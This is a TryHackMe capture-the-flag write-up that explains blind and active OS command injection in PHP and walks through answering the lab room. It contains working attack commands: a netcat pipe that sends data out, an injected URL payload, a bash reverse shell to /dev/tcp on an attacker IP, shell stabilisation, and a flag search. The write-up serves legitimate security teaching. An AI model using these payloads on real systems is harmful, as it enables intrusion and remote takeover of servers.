---
title: "TryHackMe - Injection"
categories:
  - TryHackMe
tags:
  - writeup
  - tryhackme
  - command injection
---
Walkthrough of OS Command Injection. Demonstrate OS Command Injection and explain how to prevent it on your servers

## What is Command Injection?
- Command Injection occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine.
- It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.
- Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and start looking for ways to pivot around.

## Blind Command Injection
- Blind command injection occurs when the system call that's being made does not return the response of the call to the Document Object Model (or DOM).  The DOM is where the HTML is rendered.  We can consider the DOM the canvas of an HTML document.
- Sometimes the user inputs a test command to try to see if the server is vulnerable to command injection, the command is executed by the server-side code on the server and the code doesn't output the response.
- For example, let's look at the code for the Directory Search application that Evil Corp developed.

    <a href="/assets/images/tryhackme/injection/1.png"><img src="/assets/images/tryhackme/injection/1.png"></a>

    In pseudocode, the above snippet is doing the following:
    1. Checking if the parameter "username" is set
    2. If it is, then the variable `$username` gets what was passed into the input field
    3. The variable $command gets the system command `"awk -F: '{print $1}' /etc/passwd | grep $username";` where `$username` is what was entered in step 2.  This command is printing out the list of users from `/etc/passwd` and then selecting the one that was entered.  Note that this is not executing anything yet.
    4. Variable $returned_user then gets the result/return value of the function `exec($command)`.

    The rest of the code is fairly straightforward; set $result to a Bootstrap danger alert class if nothing was found in `/etc/passwd` and a success alert class if something was found.  Easy-peasy. 

    We can see in the above code that the response is never returned anywhere on the page.  The only thing that gets returned is an alert that says whether a user was found on the system or not. 

#### Exploiting Blind Command Injection
- `ping` can help us tell whether you have blind command injection or not.  Since the code is making a system call in some way, a ping will cause the page to continue loading until the command has completed.  So if we send a ping with 10 ICMP packets, the page should be loading for about 10 seconds.  If we send 20(!) packets, it should take about 20 seconds, and so on.

- `Ping` is usually enough to tell you whether you have blind command injection, but if you want to test further, you can attempt to **redirect the output of a command to a file**, then, using the browser, navigate to the page where the file is stored.  We all know the `>` Bash operator redirects output to a file or process so you could try redirecting the output of `id`, `whoami`, `netstat`, `ip addr` or other useful command to see if you can see the results.

- There is a way to bypass the blind injection with `netcat`.  You are able to pipe the output of a command to a `nc` listener.  You could do something like `root; ls -la | nc {VPN_IP} {PORT} `. This will send the output of `ls -la` to your `netcat` listener.

#### Answer
- Ping the box with 10 packets.  What is this command (without IP address)?
> $ ping -c 10

- Redirect the box's Linux Kernel Version to a file on the web server.  What is the Linux Kernel Version?
> I use [this payload](http://10.10.253.105/?username=root%3B+uname+-a+%3E%3E+index.php). Here is the result:<br><br><a href="/assets/images/tryhackme/injection/2.png"><img src="/assets/images/tryhackme/injection/2.png"></a>

- Enter "root" into the input and review the alert.  What type of alert do you get?
> It's a success alert.<br><br><a href="/assets/images/tryhackme/injection/3.png"><img src="/assets/images/tryhackme/injection/3.png"></a>

- Enter "www-data" into the input and review the alert.  What type of alert do you get?
> It's a success alert.<br><br><a href="/assets/images/tryhackme/injection/4.png"><img src="/assets/images/tryhackme/injection/4.png"></a>

- Enter your name into the input and review the alert.  What type of alert do you get?
> It's a error alert.<br><br><a href="/assets/images/tryhackme/injection/5.png"><img src="/assets/images/tryhackme/injection/5.png"></a>

## Active Command Injection
- Active command injection will return the response to the user.  It can be made visible through several HTML elements. 
- EvilShell (evilshell.php) Code Example:

    <a href="/assets/images/tryhackme/injection/6.png"><img src="/assets/images/tryhackme/injection/6.png"></a>

    In pseudocode, the above snippet is doing the following:
    1. Checking if the parameter "commandString" is set
    2. If it is, then the variable `$command_string` gets what was passed into the input field
    3. The program then goes into a try block to execute the function `passthru($command_string)`.  You can read the docs on `passthru()` on PHP's website, but in general, it is executing what gets entered into the input then passing the output directly back to the browser.
    5. If the try does not succeed, output the error to page.  Generally this won't output anything because you can't output stderr but PHP doesn't let you have a try without a catch.

    In the above code, the function `passthru()` is actually what's doing all of the work here.  It's passing the response directly to the document so you can see the fruits of your labor right there.  Since we know that, we can go over some useful commands to try to enumerate the machine a bit further.  The function call here to `passthru()` may not always be what's happening behind the scenes, but I felt it was the easiest and least complicated way to demonstrate the vulnerability.  

- Commands to try
    - Linux
        - `whoami`
        - `id`
        - `ifconfig/ip addr`
        - `uname -a`
        - `ps -ef`

    - Windows
        - `whoami`
        - `ver`
        - `ipconfig`
        - `tasklist`
        - n`etstat -an`

#### Answer
- What strange text file is in the website root directory?
> It's `drpepper.txt`.<br><br><a href="/assets/images/tryhackme/injection/7.png"><img src="/assets/images/tryhackme/injection/7.png"></a>

- How many non-root/non-service/non-daemon users are there?
> There is 0.<br><br><a href="/assets/images/tryhackme/injection/8.png"><img src="/assets/images/tryhackme/injection/8.png"></a>

- What user is this app running as?
> It's `www-data`.<br><br><a href="/assets/images/tryhackme/injection/9.png"><img src="/assets/images/tryhackme/injection/9.png"></a>

- What is the user's shell set as?
> It's `/usr/sbin/nologin`.<br><br><a href="/assets/images/tryhackme/injection/10.png"><img src="/assets/images/tryhackme/injection/10.png"></a>

- What version of Ubuntu is running?
> Using [my handy command](https://github.com/wuvel/wuvel/blob/main/README.md). It's `18.04.4`.<br><br><a href="/assets/images/tryhackme/injection/12.png"><img src="/assets/images/tryhackme/injection/12.png"></a>

- Print out the MOTD.  What favorite beverage is shown?
> Using `cat /etc/update-motd.d/00-header`. It's `DR PEPPER`.<br><br><a href="/assets/images/tryhackme/injection/13.png"><img src="/assets/images/tryhackme/injection/13.png"></a>

## Get The Flag!
Inject our `netcat` reverse shell into the web.

```bash
bash -c 'exec bash -i &>/dev/tcp/10.11.25.205/9999 <&1'
```

Set our `netcat` listener.

```bash
$ nc -lnvp 9999                        
listening on [any] 9999 ...
```

Submit the payload and we got the shell back!

```bash
$ nc -lnvp 9999                        
listening on [any] 9999 ...
connect to [10.11.25.205] from (UNKNOWN) [10.10.253.105] 56764
bash: cannot set terminal process group (1050): Inappropriate ioctl for device
bash: no job control in this shell
www-data@injection:/var/www/html$
```

Stabilizing the shell.

```bash
www-data@injection:/var/www/html$ python -c 'import pty;pty.spawn("/bin/bash")'
<html$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@injection:/var/www/html$ export TERM=xterm
export TERM=xterm
```

Using `find` to search the flag.

```bash
www-data@injection:/tmp$ find / -type f -name "*flag*" 2>/dev/null
find / -type f -name "*flag*" 2>/dev/null
/etc/flag.txt
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/vif-0/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/usr/include/x86_64-linux-gnu/bits/waitflags.h
/usr/include/x86_64-linux-gnu/bits/ss_flags.h
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/linux/kernel-page-flags.h
/usr/include/linux/tty_flags.h
/usr/share/man/man2/ioctl_iflags.2.gz
/usr/src/linux-headers-4.15.0-101/include/uapi/linux/kernel-page-flags.h
/usr/src/linux-headers-4.15.0-101/include/uapi/linux/tty_flags.h
/usr/src/linux-headers-4.15.0-101/include/asm-generic/irqflags.h
/usr/src/linux-headers-4.15.0-101/include/trace/events/mmflags.h
/usr/src/linux-headers-4.15.0-101/include/linux/page-flags-layout.h
/usr/src/linux-headers-4.15.0-101/include/linux/pageblock-flags.h
/usr/src/linux-headers-4.15.0-101/include/linux/kernel-page-flags.h
/usr/src/linux-headers-4.15.0-101/include/linux/page-flags.h
/usr/src/linux-headers-4.15.0-101/include/linux/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/ia64/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/sh/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/score/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/frv/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/mips/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/h8300/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/xtensa/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/arm/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/parisc/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/s390/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/arm64/include/asm/daifflags.h
/usr/src/linux-headers-4.15.0-101/arch/arm64/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/microblaze/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/metag/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/blackfin/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/c6x/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/cris/include/arch-v10/arch/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/cris/include/arch-v32/arch/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/cris/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/um/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/nios2/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/sparc/include/asm/irqflags_32.h
/usr/src/linux-headers-4.15.0-101/arch/sparc/include/asm/irqflags_64.h
/usr/src/linux-headers-4.15.0-101/arch/sparc/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/openrisc/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/powerpc/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/unicore32/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/alpha/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/m68k/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/tile/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/riscv/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/x86/kernel/cpu/mkcapflags.sh
/usr/src/linux-headers-4.15.0-101/arch/x86/include/uapi/asm/processor-flags.h
/usr/src/linux-headers-4.15.0-101/arch/x86/include/asm/processor-flags.h
/usr/src/linux-headers-4.15.0-101/arch/x86/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/m32r/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/arc/include/asm/irqflags-arcv2.h
/usr/src/linux-headers-4.15.0-101/arch/arc/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/arc/include/asm/irqflags-compact.h
/usr/src/linux-headers-4.15.0-101/arch/mn10300/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/arch/hexagon/include/asm/irqflags.h
/usr/src/linux-headers-4.15.0-101/scripts/coccinelle/locks/flags.cocci
/usr/src/linux-headers-4.15.0-101-generic/include/config/arch/uses/high/vma/flags.h
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/waitflags.ph
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/ss_flags.ph
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
www-data@injection:/tmp$
```

Let's `cat` the flag.

```bash
www-data@injection:/tmp$ cat /etc/flag.txt
cat /etc/flag.txt
REDACTED
```